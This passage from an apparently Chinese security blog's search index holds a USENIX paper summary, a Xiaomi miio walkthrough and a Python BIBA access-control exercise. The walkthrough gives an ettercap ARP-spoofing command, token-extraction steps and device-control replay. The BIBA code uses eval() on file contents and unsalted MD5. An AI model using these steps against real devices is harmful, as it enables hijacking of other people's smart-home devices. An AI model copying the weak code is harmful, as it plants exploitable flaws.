recognition结合了基于语料库的NER和基于规则的NER(命名实体识别)，前者解决了设备类型和供应商名，后者使用正则表达式识别出产品型号。但是由于一个不相干的网页也可能包含设备类型的关键词(如switch)，以及一个短语可能因为满足正则表达式而被认为是型号所以表现并不好，但好在实体与实体之间具有很高的依赖性，这三个元素常常一起出现。数据挖掘算法Apriori algorithm用于从Transaction中学习“关系”。</p><h3 id="完整架构和应用"><a href="#完整架构和应用" class="headerlink" title="完整架构和应用"></a>完整架构和应用</h3><p> <img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553313904/ARE/4.png" alt></p><p>完整的ARE除了核心Rule Miner之外，还有Transaction Collection用于收集响应数据和网络爬虫，Rule Library用于存储生成的规则，Planner用于更新规则。<br>作者主要将ARE应用于三个方面，一是互联网范围的设备测量统计，二是对受损设备进行检测，三是对易受攻击的设备进行分析。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553313946/ARE/6.png" alt><br>之后对ARE的效果与Nmap进行比较和评估，从产生规则的数量、规则的准确率和覆盖率、动态学习规则的能力以及时间代价，ARE都要优于Nmap。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553313805/ARE/5.png" alt></p><h3 id="工作总结："><a href="#工作总结：" class="headerlink" title="工作总结："></a>工作总结：</h3><ul><li>提出ARE的框架：不需要数据集和人工干预，自动生成用于IOT设备识别的规则。</li><li>实现了ARE的原型并评估了它的效果：ARE在一周内生成了大量的规则，而且IOT设备识别的细粒度超过现有工具。</li><li>应用于三个场景中，主要发现有：大量IOT设备在互联网中可以抵达；成千上万的IOT设备易受攻击且暴露给了公众。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 顶会论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> USENIX </tag>
            
            <tag> 数据挖掘 </tag>
            
            <tag> 自然语言处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用miio控制局域网内的小米智能设备</title>
      <link href="/2018/12/15/miio-control/"/>
      <url>/2018/12/15/miio-control/</url>
      
        <content type="html"><![CDATA[<h1 id="控制局域网内的IOT设备"><a href="#控制局域网内的IOT设备" class="headerlink" title="控制局域网内的IOT设备"></a>控制局域网内的IOT设备</h1><h2 id="中间人攻击—流量分析"><a href="#中间人攻击—流量分析" class="headerlink" title="中间人攻击—流量分析"></a>中间人攻击—流量分析</h2><h3 id="使用Nmap分析局域网内设备，得到智能设备的IP"><a href="#使用Nmap分析局域网内设备，得到智能设备的IP" class="headerlink" title="使用Nmap分析局域网内设备，得到智能设备的IP"></a>使用Nmap分析局域网内设备，得到智能设备的IP</h3><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553323434/miio/1.png" alt><br>    小米智能插座：192.168.31.197 网关：192.168.31.147（控制它的手机ip）</p><h3 id="ettercap嗅探智能设备和网关之间的流量"><a href="#ettercap嗅探智能设备和网关之间的流量" class="headerlink" title="ettercap嗅探智能设备和网关之间的流量"></a>ettercap嗅探智能设备和网关之间的流量</h3><p>sudo ettercap -i ens33 -T -q -M ARP:remote /192.168.31.197// /192.168.31.147//</p><h3 id="wireshark抓包分析"><a href="#wireshark抓包分析" class="headerlink" title="wireshark抓包分析"></a>wireshark抓包分析</h3><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553323435/miio/2.png" alt><br>从图中可以看出，设备的命令控制包为UDP传输，既然是UDP协议传输，那么是否可以通过命令包重放攻击来对设备进行控制？<br>了解到在homeassistant中可实现对小米设备的集成，并在其中对设备进行管理和操作。Homeassistant，主要以Python语言开发，既然它能操控小米设备，那它底层肯定有相关的函数调用库。<br>为了可以消除对专有软件(米家app)的依赖，并能控制自己的设备，所以出现了MiIo。设备和米家app在同一局域网下使用的加密专有网络协议我们称之为MiIo协议。<br>Miio库支持的设备有：<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553323434/miio/3.png" alt></p><h2 id="小米IOT控制流程"><a href="#小米IOT控制流程" class="headerlink" title="小米IOT控制流程"></a>小米IOT控制流程</h2><p>在同一局域网中，小米设备可以使用专有的加密UDP网络协议进行通信控制。在网络可达的前提下，向小米设备发送hello bytes就可以获得含有token的结构体数据。之后，构造相应的结构体，并且以同样的方式发送给设备即可完成控制。具体流程如下：<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553323435/miio/4.png" alt></p><h2 id="设备Token的获取方式"><a href="#设备Token的获取方式" class="headerlink" title="设备Token的获取方式"></a>设备Token的获取方式</h2><p>小米设备的token获取有三种途径：miio获取、从米家app获取、从数据库获取</p><h3 id="miio获取"><a href="#miio获取" class="headerlink" title="miio获取"></a>miio获取</h3><p>在ubuntu下，先安装miio，然后发现设备：<br>npminstall -g miio<br>miiodiscover<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553323440/miio/5.png" alt><br>但是很可惜，很多设备隐藏了token，使用该方法可能无法获取到token或获取到的token不正确。</p><h3 id="米家app获取"><a href="#米家app获取" class="headerlink" title="米家app获取"></a>米家app获取</h3><p>这种方法需要的mijia app版本较老，且只对部分设备有效。</p><h3 id="从数据库获取token"><a href="#从数据库获取token" class="headerlink" title="从数据库获取token"></a>从数据库获取token</h3><p>这种方法仅在Mi Home 5.0.19之前的版本可用。<br>该方法是读取手机中米家的app中的数据记录来获取设备的token，具体步骤如下：</p><ul><li>准备一部获取root权限的安卓手机</li><li>安装米家app并登录账号</li><li>进入/data/data/com.xiaomi.smarthome/databases/</li><li>拷贝db，下载到电脑</li><li><a href="http://miio2.yinhh.com/" target="_blank" rel="noopener">前往网站</a>，上传db，点击提交，即可获得token。</li><li>8894c73cbd5c7224fb4b8a39e360c255<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553323440/miio/6.png" alt></li></ul><h2 id="脚本控制IOT设备"><a href="#脚本控制IOT设备" class="headerlink" title="脚本控制IOT设备"></a>脚本控制IOT设备</h2><p>首先随意发送hellobytes获得时间和设备ID，token我们自己设置；然后构造发送的数据结构msg，cmd中的method包括：set_power(控制开关)、get_prop(获取状态)，控制的params是[‘on’]/ [‘off’]，获取状态的params是[‘power’, ‘temperature’]<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553323440/miio/7.png" alt><br>如果获得了token，就能对小米的设备进行操作，如图下面是返回的信息。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553323440/miio/8.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从目前的智能家居市场来看，用户不会只使用单个智能设备厂商的设备，所以对于厂商来说，通过开放接口给用户一些局域网的控制“自由”，实现不同厂商设备的联动是一个不错的选择。<br>从另外一个角度，本文中体现的安全问题我们也不容忽视。如果在局域网中不经过认证就能获取物联网设备的访问凭证，并进而进行控制，无形中给入侵者留了一扇门。例如，攻击者可经过扫描互联网发现家庭路由器，并利用弱口令或设备漏洞获得路由器的shell权限，接下来就可按照文中步骤就可以获得设备token进而控制。好在小米已经在最新的miio版本中修复了这一漏洞，大大提高了攻击者获取token的难度。</p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小米 </tag>
            
            <tag> miio </tag>
            
            <tag> 中间人 </tag>
            
            <tag> 重放攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用python实现BIBA模型</title>
      <link href="/2018/11/16/BIBA%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B%E5%AE%9E%E7%8E%B0(python)/"/>
      <url>/2018/11/16/BIBA%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B%E5%AE%9E%E7%8E%B0(python)/</url>
      
        <content type="html"><![CDATA[<h1 id="基于python语言的BIBA模型图形界面实现"><a href="#基于python语言的BIBA模型图形界面实现" class="headerlink" title="基于python语言的BIBA模型图形界面实现"></a>基于python语言的BIBA模型图形界面实现</h1><h2 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h2><ol><li><strong>查阅资料，了解biba安全模型的相关知识</strong></li><li><strong>通过编程实现基于biba模型的完整性访问控制，进一步掌握biba模型的规则</strong></li><li><strong>使用python语言实现，熟练pyqt的图形界面设计方法</strong></li></ol><hr><h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><ul><li>操作系统：Windows10</li><li>工具版本：python3.7，pyqt5</li></ul><hr><h2 id="实验原理："><a href="#实验原理：" class="headerlink" title="实验原理："></a>实验原理：</h2><h4 id="什么是安全模型"><a href="#什么是安全模型" class="headerlink" title="什么是安全模型"></a>什么是安全模型</h4><ul><li>系统的元素  <blockquote><p>具有行为能力的主体<br>不具有行为能力的客体</p></blockquote></li><li>系统的操作行为<blockquote><p>可以执行的命令：读、写、执行</p></blockquote></li><li>对系统行为的约束方式<blockquote><p>对行为的控制策略</p></blockquote></li><li>模型从抽象层次规定了系统行为和约束行为的方式</li><li>模型往往用状态来表示<blockquote><p>系统行为所依赖的环境<br>行为对系统产生的效果</p></blockquote><h4 id="biba完整性模型："><a href="#biba完整性模型：" class="headerlink" title="biba完整性模型："></a>biba完整性模型：</h4><ul><li>完整性威胁问题<blockquote><p>完整性的威胁就是一个子系统在初始时刻认为不正常的修改行为；<br>来源：内部&amp;外部；<br>类型：直接&amp;间接</p></blockquote></li></ul></li></ul><table><thead><tr><th>外部的直接</th><th>外部的间接</th><th>内部的直接</th><th>内部的间接</th></tr></thead><tbody><tr><td>外部系统恶意地篡改另一个系统的数据或程序</td><td>一个外部系统插入恶意的子程序</td><td>修改自己的代码</td><td>修改自己的指针</td></tr></tbody></table><ul><li>biba模型的完整性定义<blockquote><p>完整性级别高的实体对完整性低的实体具有完全的支配性，反之如果一个实体对另一个实体具有完全的控制权，说明前者完整性级别更高，这里的实体既可以是主体也可以是客体。<br>完整性级别和可信度有密切的关系，完整级别越高，意味着可信度越高。</p></blockquote></li><li>biba模型的规则   </li></ul><ul><li style="list-style: none"><input type="checkbox"> 对于写和执行操作，有如下规则：<blockquote><p><strong>写规则控制</strong><br>当且仅当主体S的完整性级别大于或等于客体O的完整性级别时，主体S可以写客体O,一般称之为<strong>上写</strong>。<br><strong>执行操作控制</strong><br>当且仅当主体S2的完整性级别高于或等于S1,主体S1可以执行主体S2。  </p></blockquote></li><li style="list-style: none"><input type="checkbox"> 关于读操作，有不同的控制策略：<blockquote><p><strong>低水标模型</strong><br>任意主体可以读任意完整性级别的客体，但是如果主体读完整性级别比自己低的客体时，主体的完整性级别将为客体完整性级别，否则，主体的完整性级别保持不变。<br><strong>环模型</strong><br>不管完整性级别如何，任何主体都可以读任何客体<br><strong>严格完整性模型</strong><br>这个模型对读操作是根据主客体的完整性级别严格控制的，即只有完整性级别低或相等的主体才可以读完整性级别高的客体，称为<strong>下读</strong></p></blockquote></li></ul><p><strong>一般都是指毕巴严格完整性模型，总结来说是上写、下读</strong></p><hr><h2 id="实验内容："><a href="#实验内容：" class="headerlink" title="实验内容："></a>实验内容：</h2><h3 id="用户登录实现"><a href="#用户登录实现" class="headerlink" title="用户登录实现"></a>用户登录实现</h3><p><strong>核对用户输入的账户密码与存储的是否匹配</strong></p><p><img src="https://github.com/Cool-Y/BIBA-model/blob/master/img/login.PNG" alt="login"></p><ul><li>从用户输入框获取账户和密码</li><li>检查输入信息是否合法（为空）</li><li>从password.txt中获取，并保存在列表listFromLine中</li><li>检查输入的账户是否存在</li><li>若存在，检查对应的密码是否正确</li><li><p>若正确，判断是管理员还是普通用户，并跳转相应的界面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkPass</span><span class="params">(self)</span>:</span></span><br><span class="line">    nameIn = self.lineEdit.text()</span><br><span class="line">    passwdIn = self.lineEdit_2.text()</span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(passwdIn.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    passwdIn = md5.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (nameIn == <span class="string">''</span>) <span class="keyword">or</span> (passwdIn == <span class="string">''</span>):</span><br><span class="line">        QMessageBox.warning(self,</span><br><span class="line">                            <span class="string">"警告"</span>,</span><br><span class="line">                            <span class="string">"账号和密码不能为空"</span>,</span><br><span class="line">                            QMessageBox.Yes)</span><br><span class="line">        self.lineEdit.setFocus()</span><br><span class="line">    print(nameIn, passwdIn)</span><br><span class="line">    fr = open(<span class="string">'./etc/passwd.txt'</span>)</span><br><span class="line">    arrayofLines = fr.readlines()</span><br><span class="line">    numberofLines = len(arrayofLines)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> arrayofLines:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        listFromLine = line.split(<span class="string">':'</span>)</span><br><span class="line">        name = listFromLine[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> name == nameIn:</span><br><span class="line">            numberofLines = <span class="number">-1</span></span><br><span class="line">            passwd = listFromLine[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> passwd == passwdIn:</span><br><span class="line">                group = listFromLine[<span class="number">2</span>]</span><br><span class="line">                print(<span class="string">"\n登录成功!\n"</span>)</span><br><span class="line">                <span class="keyword">if</span> name == <span class="string">'root'</span>:</span><br><span class="line">                    print(<span class="string">'root登录'</span>)</span><br><span class="line">                    rootUI.show()</span><br><span class="line">                    MainWindow.close()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    urName = nameIn</span><br><span class="line">                    mainUI.lineEdit.setText(urName)</span><br><span class="line">                    mainUI.lineEdit_2.setText(group)</span><br><span class="line">                    mainUI.show()</span><br><span class="line">                    MainWindow.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                QMessageBox.warning(self,</span><br><span class="line">                                    <span class="string">"警告"</span>,</span><br><span class="line">                                    <span class="string">"密码错误！"</span>,</span><br><span class="line">                                    QMessageBox.Yes)</span><br><span class="line">                self.lineEdit.setFocus()</span><br><span class="line">    fr.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="管理员功能实现"><a href="#管理员功能实现" class="headerlink" title="管理员功能实现"></a>管理员功能实现</h3><p><strong>管理员可以对用户进行增、删、查的操作</strong></p><p><img src="https://github.com/Cool-Y/BIBA-model/blob/master/img/rootUI.PNG" alt="login"></p><h4 id="增加用户的实现"><a href="#增加用户的实现" class="headerlink" title="增加用户的实现"></a>增加用户的实现</h4><blockquote><ul><li>获取管理员输入的用户名、密码和用户等级</li><li>将明文密码转换为md5值</li><li>判断输入的账户是否已经存在以及是否为空</li><li>如果没有问题，将其存入passwd.txt的末尾</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">adduser</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">'开始添加'</span>)</span><br><span class="line">      name = self.lineEdit_4.text()</span><br><span class="line">      passwd = self.lineEdit_6.text()</span><br><span class="line">      md5 = hashlib.md5()</span><br><span class="line">      md5.update(passwd.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">      passwd = md5.hexdigest()</span><br><span class="line">      group = self.comboBox.currentText()</span><br><span class="line">      self.name = name</span><br><span class="line">      <span class="keyword">if</span> self.euxit():</span><br><span class="line">          <span class="keyword">if</span> name == <span class="string">''</span> <span class="keyword">or</span> passwd == <span class="string">''</span>:</span><br><span class="line">              QMessageBox.warning(self,</span><br><span class="line">                                  <span class="string">"警告"</span>,</span><br><span class="line">                                  <span class="string">"账号和密码不能为空"</span>,</span><br><span class="line">                                  QMessageBox.Yes)</span><br><span class="line">              self.lineEdit.setFocus()</span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">              cur_path = os.getcwd()</span><br><span class="line">              filename = cur_path + <span class="string">'/etc/passwd.txt'</span></span><br><span class="line">              fi = open(filename, <span class="string">'r+'</span>)</span><br><span class="line">              str = name + <span class="string">':'</span> + passwd + <span class="string">':'</span> + group + <span class="string">'\n'</span></span><br><span class="line">              print(<span class="string">'成功增加用户'</span> + str + <span class="string">'\n'</span>)</span><br><span class="line">              fi.seek(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">              fi.write(str)</span><br><span class="line">              fi.close()</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          QMessageBox.warning(self,</span><br><span class="line">                              <span class="string">"警告"</span>,</span><br><span class="line">                              <span class="string">"用户已存在"</span>,</span><br><span class="line">                              QMessageBox.Yes)</span><br><span class="line">          self.lineEdit.setFocus()</span><br></pre></td></tr></table></figure><h4 id="查询已有用户的实现"><a href="#查询已有用户的实现" class="headerlink" title="查询已有用户的实现"></a>查询已有用户的实现</h4><blockquote><p>从passwd.txt中逐行读出</p></blockquote><p><img src="https://github.com/Cool-Y/BIBA-model/blob/master/img/existUser.PNG" alt="login"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readuser</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">'readuser'</span>)</span><br><span class="line">      cur_path = os.getcwd()</span><br><span class="line">      filename = cur_path + <span class="string">'/etc/passwd.txt'</span></span><br><span class="line">      fo = open(filename)</span><br><span class="line">      arrayofLines = fo.readlines()</span><br><span class="line">      names = <span class="string">''</span></span><br><span class="line">      <span class="keyword">for</span> line <span class="keyword">in</span> arrayofLines:</span><br><span class="line">          line = line.strip()</span><br><span class="line">          listFromLine = line.split(<span class="string">':'</span>)</span><br><span class="line">          names = names + listFromLine[<span class="number">0</span>] + <span class="string">'\n'</span></span><br><span class="line">      self.textEdit.setPlaceholderText(names)</span><br></pre></td></tr></table></figure><h4 id="删除用户的实现"><a href="#删除用户的实现" class="headerlink" title="删除用户的实现"></a>删除用户的实现</h4><blockquote><p>从passwd.txt中逐行读出用户名，并与待删除用户比较，如果相同，则删除该行</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rmuser</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="number">1</span>)</span><br><span class="line">      cur_path = os.getcwd()</span><br><span class="line">      filename = cur_path + <span class="string">'/etc/passwd.txt'</span></span><br><span class="line">      rmName = self.lineEdit.text()</span><br><span class="line">      <span class="keyword">with</span> open(filename, <span class="string">'r'</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> r:</span><br><span class="line">          lines = r.readlines()</span><br><span class="line">          lenl = len(lines)</span><br><span class="line">      <span class="keyword">with</span> open(filename, <span class="string">'w'</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> w:</span><br><span class="line">          <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">              l = line.strip()</span><br><span class="line">              listFromLine = l.split(<span class="string">':'</span>)</span><br><span class="line">              <span class="keyword">if</span> rmName == listFromLine[<span class="number">0</span>]:</span><br><span class="line">                  print(<span class="string">'删除用户'</span> + rmName)</span><br><span class="line">                  <span class="keyword">continue</span></span><br><span class="line">              <span class="keyword">if</span> line == <span class="string">'\n'</span>:</span><br><span class="line">                  print(<span class="string">'find换行'</span>)</span><br><span class="line">                  line = <span class="string">''</span></span><br><span class="line">              w.write(line)</span><br></pre></td></tr></table></figure><hr><h3 id="普通用户功能实现"><a href="#普通用户功能实现" class="headerlink" title="普通用户功能实现"></a>普通用户功能实现</h3><p><strong>普通用户可以完成对合法权限文件的读取、增加内容（上写下读）以及创建文件的操作</strong></p><p><img src="https://github.com/Cool-Y/BIBA-model/blob/master/img/normal.PNG" alt="login"></p><h4 id="读取文件内容"><a href="#读取文件内容" class="headerlink" title="读取文件内容"></a>读取文件内容</h4><blockquote><p>双击文件名<br>获取选中文件和当前用户的完整性级别<br>如果用户的级别低于文件，则读取文件内容</p></blockquote>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">(self)</span>:</span></span><br><span class="line">    dict = self.getGrade()</span><br><span class="line">    fgrade = str(dict[self.file_path])</span><br><span class="line">    ugrade = self.lineEdit_2.text()</span><br><span class="line">    <span class="keyword">if</span> ugrade &gt;=  fgrade:</span><br><span class="line">        print(ugrade+ <span class="string">' 正在读取  '</span>+fgrade)</span><br><span class="line">        filename = self.file_path</span><br><span class="line">        print(filename)</span><br><span class="line">        fr = open(filename)</span><br><span class="line">        lines = <span class="string">''</span></span><br><span class="line">        arrayofLines = fr.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> arrayofLines:</span><br><span class="line">            lines += line</span><br><span class="line">        self.textEdit.setText(lines)</span><br><span class="line">        print(<span class="string">'读取成功\n'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        QMessageBox.warning(self,</span><br><span class="line">                            <span class="string">"警告"</span>,</span><br><span class="line">                            <span class="string">"您的用户等级太高"</span>,</span><br><span class="line">                            QMessageBox.Yes)</span><br><span class="line">        self.lineEdit.setFocus()</span><br></pre></td></tr></table></figure><h4 id="增加文件内容"><a href="#增加文件内容" class="headerlink" title="增加文件内容"></a>增加文件内容</h4><blockquote><p>双击文件名<br>获取选中文件和当前用户的完整性级别<br>如果用户的级别高于文件，则写入文件内容</p></blockquote>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writefile</span><span class="params">(self)</span>:</span></span><br><span class="line">    dict = self.getGrade()</span><br><span class="line">    fgrade = dict[self.file_path]</span><br><span class="line">    ugrade = self.lineEdit_2.text()</span><br><span class="line">    print(ugrade + <span class="string">' 正在写入  '</span> + fgrade)</span><br><span class="line">    <span class="keyword">if</span> ugrade &lt;= fgrade:</span><br><span class="line">        filename = self.file_path</span><br><span class="line">        str = self.textEdit.toPlainText()</span><br><span class="line">        print(str)</span><br><span class="line">        fo = open(filename, <span class="string">'r+'</span>)</span><br><span class="line">        fo.seek(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">        fo.write(str)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        QMessageBox.warning(self,</span><br><span class="line">                            <span class="string">"警告"</span>,</span><br><span class="line">                            <span class="string">"您的用户等级太低"</span>,</span><br><span class="line">                            QMessageBox.Yes)</span><br><span class="line">        self.lineEdit.setFocus()</span><br></pre></td></tr></table></figure><h4 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h4><blockquote><p>获取当前用户名和输入的文件名<br>在当前路径下创建名为用户名的文件<br>并对新创建的文件与用户等级建立字典，新文件路径为key，用户等级为value<br>这个字典方便读写时判断等级高低</p></blockquote>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">touchfile</span><span class="params">(self)</span>:</span></span><br><span class="line">    urName = self.lineEdit.text()</span><br><span class="line">    filename = self.lineEdit_4.text()</span><br><span class="line">    cur_path = os.getcwd()</span><br><span class="line">    new_path = os.path.join(cur_path + <span class="string">'/file'</span>, urName)</span><br><span class="line">    print(urName)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(new_path) == <span class="literal">False</span>:</span><br><span class="line">        os.mkdir(new_path)</span><br><span class="line">    os.chdir(new_path)</span><br><span class="line">    fr = open(filename, <span class="string">'w'</span>)</span><br><span class="line">    key = (new_path + <span class="string">'/'</span> + filename).replace(<span class="string">'\\'</span>, <span class="string">'/'</span>)</span><br><span class="line">    fr.close()</span><br><span class="line">    os.chdir(cur_path)</span><br><span class="line">    fa = open(<span class="string">'./etc/ac.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">    a = fa.read()</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">        dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dict = eval(a)</span><br><span class="line">    dict[key] = self.lineEdit_2.text()</span><br><span class="line">    fr = open(<span class="string">'./etc/ac.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">    fr.write(str(dict))</span><br><span class="line">    fr.close()</span><br><span class="line">    fa.close()</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> 理论学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模型实现 </tag>
            
            <tag> python </tag>
            
            <tag> 访问控制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2000/01/01/hello-world/"/>
      <url>/2000/01/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>你好！我是混元霹雳手</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
